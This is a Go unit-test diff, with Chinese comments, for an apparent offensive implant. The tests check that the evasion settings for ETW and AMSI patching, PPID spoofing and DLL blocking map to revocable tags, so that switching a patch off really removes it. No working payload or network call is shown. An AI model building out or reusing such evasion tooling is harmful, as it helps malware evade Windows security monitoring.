@@ -3,6 +3,7 @@
 package commands
 
 import (
+	"implant/core/evasion"
 	"strings"
 	"testing"
 
@@ -203,3 +204,35 @@ func TestEvasionGatesAreRuntimeRead(t *testing.T) {
 	}
 }
 
+// ===== 能力 → 台账 tag 的映射 =====
+//
+// 映射错了会让 `evasion off amsi` 去撤 ETW（或什么都不撤），
+// 表面上"已关闭"而实际补丁还在。
+
+func TestRevocableTagMapping(t *testing.T) {
+	cases := []struct {
+		key    config.EvasionKey
+		want   string
+		wantOK bool
+	}{
+		{config.EvasionETW, evasion.TagETW, true},
+		{config.EvasionAMSI, evasion.TagAMSI, true},
+		// 其余能力没有进程内补丁可撤
+		{config.EvasionSpoof, "", false},
+		{config.EvasionPPID, "", false},
+		{config.EvasionBlockDLLs, "", false},
+	}
+	for _, c := range cases {
+		got, ok := revocableTag(c.key)
+		if ok != c.wantOK || got != c.want {
+			t.Errorf("revocableTag(%s) = (%q,%v)，期望 (%q,%v)", c.key, got, ok, c.want, c.wantOK)
+		}
+	}
+}
+
+// tag 必须与 pkg 内部常量一致（改名会静默让撤销失效）
+func TestRevocableTagMatchesEvasionConstants(t *testing.T) {
+	if evasion.TagETW != "etw" || evasion.TagAMSI != "amsi" {
+		t.Errorf("tag 常量被改动: TagETW=%q TagAMSI=%q", evasion.TagETW, evasion.TagAMSI)
+	}
+}
